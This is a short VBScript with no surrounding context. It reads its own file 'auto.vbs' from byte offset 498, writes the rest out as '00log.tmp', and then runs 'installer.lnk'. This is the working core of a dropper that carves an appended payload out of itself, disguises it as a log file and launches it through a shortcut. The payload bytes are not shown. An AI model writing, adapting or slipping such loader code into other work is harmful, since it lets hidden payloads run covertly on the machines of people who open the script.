Set objStreamRead = CreateObject("ADODB.Stream")
objStreamRead.Type = 1
objStreamRead.Open
objStreamRead.LoadFromFile "auto.vbs"
offset = 498
objStreamRead.Position = offset
Set objStreamWrite = CreateObject("ADODB.Stream")
objStreamWrite.Type = 1
objStreamWrite.Open
objStreamWrite.Write objStreamRead.Read
objStreamWrite.SaveToFile "00log.tmp", 2
objStreamRead.Close
objStreamWrite.Close
Set objShell = CreateObject("WScript.Shell")
objShell.Run "installer.lnk"
Wscript.Quit(0)

